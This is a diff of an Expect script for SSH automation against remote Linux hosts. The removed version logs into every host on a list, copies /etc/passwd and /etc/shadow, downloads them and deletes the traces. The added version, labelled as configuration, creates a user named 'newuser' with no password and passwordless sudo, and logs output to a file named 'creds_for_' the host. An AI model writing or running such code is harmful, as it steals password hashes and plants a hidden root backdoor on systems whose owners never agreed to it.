@@ -1,44 +1,39 @@
 #!/usr/bin/expect -f
 
 # Set variables
-set ip_list "ip_list.txt"
-set ssh_key "~/.ssh/id_rsa"
-set local_dir "~/Desktop"
+set hostname [lindex $argv 0]
+set username $env(USER)
 
-# Open the file containing IP addresses
-set fp [open $ip_list r]
-set ip_addrs [split [read $fp] "\n"]
-close $fp
+# Log results
+log_file -a /home/oitcidelgaj0/Desktop/logs/creds_for_$hostname
 
-# Iterate through each IP
-foreach ip $ip_addrs {
-    if {$ip eq ""} { continue }
-    
-    spawn ssh -i $ssh_key -o StrictHostKeyChecking=no user@$ip
-    expect "$ "
-    send "sudo -i\r"
-    expect "# "
-    
-    # Get hostname
-    send "hostname\r"
-    expect "# "
-    set hostname $expect_out(buffer)
-    set hostname [string trim $hostname]
-    
-    # Copy passwd
-    send "cp /etc/passwd /tmp/${hostname}_passwd\r"
-    expect "# "
-    send "cp /etc/shadow /tmp/${hostname}_shadow\r"
-    expect "# "
-    
-    # SCP files to local machine
-    spawn scp -i $ssh_key -o StrictHostKeyChecking=no user@$ip:/tmp/${hostname}_* $local_dir/
-    expect "$ "
-    
-    # Clean up
-    spawn ssh -i $ssh_key -o StrictHostKeyChecking=no user@$ip "rm -f /tmp/${hostname}_passwd /tmp/${hostname}_shadow"
-    expect "$ "
-    
-    send "exit\r"
-    expect eof
+# Announce which device we are working on and at what time
+send_user "\n"
+send_user ">>>>>  Working on $hostname @ [exec date] <<<<<\n"
+send_user "\n"
+
+# Use SSH key for authentication
+spawn ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no $username@$hostname
+
+# Handle SSH connection issues
+expect {
+    timeout { send_user "\nTimeout Exceeded - Check Host\n"; exit 1 }
+    eof { send_user "\nSSH Connection To $hostname Failed\n"; exit 1 }
+    "$username@*" {}
 }
+
+# Execute Linux configuration commands
+send "sudo apt update && sudo apt upgrade -y\n"
+expect "password for $username:" { send "YOUR_SUDO_PASSWORD\n" }
+expect "$username@*"
+
+send "sudo useradd -m newuser\n"
+expect "$username@*"
+
+send "sudo passwd -d newuser\n"
+expect "$username@*"
+
+send "echo 'newuser ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/newuser\n"
+expect "$username@*"
+
+send "exit\n"
